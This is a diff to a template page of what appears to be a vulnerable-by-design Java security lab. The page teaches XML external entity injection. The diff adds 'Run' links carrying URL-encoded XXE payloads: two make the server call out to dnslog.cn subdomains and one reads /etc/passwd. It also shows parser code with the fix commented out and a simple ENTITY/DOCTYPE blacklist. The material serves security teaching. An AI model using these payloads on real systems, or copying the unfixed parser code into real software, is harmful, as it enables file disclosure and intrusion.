@@ -14,13 +14,13 @@
         <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">
             <div class="vul_header">
                 <span>XML外部实体注入</span>
-                <a class="btn btn-sm btn-primary" target="_blank" href="">漏洞案例</a>
             </div>
             <hr>
 
             <ul class="nav nav-tabs">
                 <li class="nav-item">
-                    <a class="nav-link active" data-toggle="tab" href="#aa"><span class="lnr lnr-bug"></span> 漏洞描述</a>
+                    <a class="nav-link active" data-toggle="tab" href="#aa"><span class="lnr lnr-bug"></span>
+                        漏洞描述</a>
                 </li>
                 <li class="nav-item">
                     <a class="nav-link" data-toggle="tab" href="#bb"><span class="lnr lnr-bullhorn"></span> 安全编码</a>
@@ -47,11 +47,15 @@
 
             <div class="box-float">
                 <div class="float1">
-                    <a style="float:right" class="btn btn-sm btn-danger"
-                       th:href="@{/XXE/XMLReader}">运行</a>
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                       th:href="@{/XXE/XMLReader?content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%36%31%67%6b%62%38%2e%64%6e%73%6c%6f%67%2e%63%6e%22%3e%5d%3e%3c%72%6f%6f%74%3e%26%78%78%65%3b%3c%2f%72%6f%6f%74%3e}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - XMLReader</span></h5>
-                    <textarea class="form-control" id="code1">
-@RequestMapping(value = "/XMLReader")
+                    <label for="code1"></label><textarea class="form-control" id="code1">
 public String XMLReader(@RequestBody String content) {
     try {
         XMLReader xmlReader = XMLReaderFactory.createXMLReader();
@@ -60,25 +64,35 @@ public String XMLReader(@RequestBody String content) {
         xmlReader.parse(new InputSource(new StringReader(content)));
         return "XMLReader XXE";
     } catch (Exception e) {
-    return e.toString();
+        return e.toString();
     }
 }
-                    </textarea> <br><br>
+                    </textarea><br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger"
-                       th:href="@{/XXE/SAXBuilder}">运行</a>
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                       th:href="@{/XXE/SAXReader?content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%30%67%35%7a%76%64%2e%64%6e%73%6c%6f%67%2e%63%6e%22%3e%5d%3e%3c%72%6f%6f%74%3e%26%78%78%65%3b%3c%2f%72%6f%6f%74%3e}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - SAXReader</span></h5>
                     <textarea class="form-control" id="code2">
 SAXReader sax = new SAXReader();
 // 修复：禁用外部实体
 // sax.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
 sax.read(new InputSource(new StringReader(content)));
-                    </textarea> <br><br>
+                    </textarea><label for="code2"> </label> <br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger"
-                       th:href="@{/XXE/SAXBuilder}">运行</a>
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                       th:href="@{/XXE/SAXBuilder}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - SAXBuilder</span></h5>
-                    <textarea class="form-control" id="code3">
+                    <label for="code3"></label><textarea class="form-control" id="code3">
 @RequestMapping(value = "/SAXBuilder")
 public String SAXBuilder(@RequestBody String content) {
     try {
@@ -95,19 +109,30 @@ public String SAXBuilder(@RequestBody String content) {
                 </div>
 
                 <div class="float2">
-                    <a style="float:right" class="btn btn-sm btn-danger"
-                       th:href="@{/XXE/DocumentBuilder}">运行</a>
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                       th:href="@{/XXE/DocumentBuilder?content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%3e%5d%3e%3c%70%65%72%73%6f%6e%3e%3c%6e%61%6d%65%3e%26%78%78%65%3b%3c%2f%6e%61%6d%65%3e%3c%2f%70%65%72%73%6f%6e%3e}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - DocumentBuilder</span></h5>
-                    <textarea class="form-control" id="code4">
+                    <label for="code4"></label><textarea class="form-control" id="code4">
 DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
-// 修复: dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+// 修复: 禁用外部实体
+// factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
 DocumentBuilder builder = factory.newDocumentBuilder();
                     </textarea><br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger"
-                       th:href="@{/XXE/unmarshaller}">运行</a>
+                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                       th:href="@{/XXE/unmarshaller}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
                     <h5><span class="lnr lnr-bug"> 漏洞代码 - Unmarshaller</span></h5>
-                    <textarea class="form-control" id="code5">
+                    <label for="code5"></label><textarea class="form-control" id="code5">
 /**
   *  PoC
   * Content-Type: application/xml
@@ -132,6 +157,26 @@ public String Unmarshaller(@RequestBody String content) {
     e.printStackTrace();
 }
 
+                    </textarea><br><br>
+
+                    <a style="float:right" class="btn btn-sm btn-success" target="_blank"
+                       th:href="@{/XXE/safe?content=%3c!ENTITY}">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
+                    <h5><span class="lnr lnr-smile"> 安全代码 - 黑名单过滤</span></h5>
+                    <label for="code6"></label><textarea class="form-control" id="code6">
+public static boolean checkXXE(String content) {
+    String[] black_list = {"ENTITY", "DOCTYPE"};
+    for (String s : black_list) {
+        if (content.toUpperCase().contains(s)) {
+            return true;
+        }
+    }
+    return false;
+}
                     </textarea>
 
                 </div>
